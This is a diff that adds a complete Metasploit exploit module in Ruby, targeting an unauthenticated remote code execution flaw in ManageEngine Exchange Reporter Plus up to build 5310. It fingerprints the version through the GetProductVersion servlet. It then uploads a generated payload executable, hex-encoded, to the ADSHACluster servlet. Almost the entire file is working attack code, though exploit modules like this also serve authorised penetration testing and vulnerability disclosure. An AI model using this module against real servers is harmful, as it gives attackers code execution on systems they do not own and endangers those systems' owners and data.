@@ -1,0 +1,92 @@
+require 'msf/core'
+
+class MetasploitModule  < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	include Msf::Exploit::Remote::HttpClient
+	include Msf::Exploit::EXE
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Manage Engine Exchange Reporter Plus Unauthenticated RCE',
+			'Description'    => %q{
+				This module exploits a remote code execution vulnerability that
+				exists in Exchange Reporter Plus <= 5310, caused by execution of
+				bcp.exe file inside ADSHACluster servlet
+			},
+			'License'        => MSF_LICENSE,
+			'Author'         =>
+				[
+					'Kacper Szurek'
+				],
+			'References'     =>
+		        [
+		          ['URL', 'https://security.szurek.pl/manage-engine-exchange-reporter-plus-unauthenticated-rce.html']
+		        ], 
+			'Platform'          => [ 'win' ],
+			'Targets'        =>
+				[
+					['Universal', {}]
+				],
+			'DisclosureDate' => '28.06.2018',
+			'DefaultTarget'  => 0))
+
+		register_options(
+			[
+				OptString.new('TARGETURI', [ true, 'The path to Manage Engine root', '/'])
+			], self.class)
+
+	end
+
+	def bin_to_hex(s)
+	    s.each_byte.map { |b| b.to_s(16).rjust(2,'0') }.join
+	end
+
+	def check
+		uri = target_uri.path
+
+		res = send_request_cgi({
+			'method'   => 'POST',
+			'uri'      => normalize_uri(uri, '/exchange/servlet/GetProductVersion')
+		})
+
+		json = res.get_json_document
+
+		if json.empty? || !json['BUILD_NUMBER']
+			fail_with(Failure::Unknown, 'Server error')
+		end
+
+		print_status "Version: #{json['BUILD_NUMBER']}"
+
+		if json['BUILD_NUMBER'].to_i <= 5310
+			Exploit::CheckCode::Vulnerable
+		else
+			Exploit::CheckCode::Safe
+		end
+	end
+
+	def exploit
+		uri = target_uri.path
+
+		res = send_request_cgi({
+			'method'   => 'POST',
+			'uri'      => normalize_uri(uri, '/exchange/servlet/ADSHACluster'),
+			'vars_post' => {
+				'MTCALL' => "nativeClient",
+				'BCP_RLL' => "0102",
+				'BCP_EXE' => bin_to_hex(generate_payload_exe)
+			}
+		})
+
+		# It waits until payload exit/migrate
+		if res && res.code == 200
+			if res.body.to_s.include? '{"STATUS":"error"}'
+				print_good("Successful exploitation")
+			else
+				print_error("Wrong response: #{res.body}")
+			end
+		else
+			print_error("Request failed or timeout")
+		end
+	end
+end
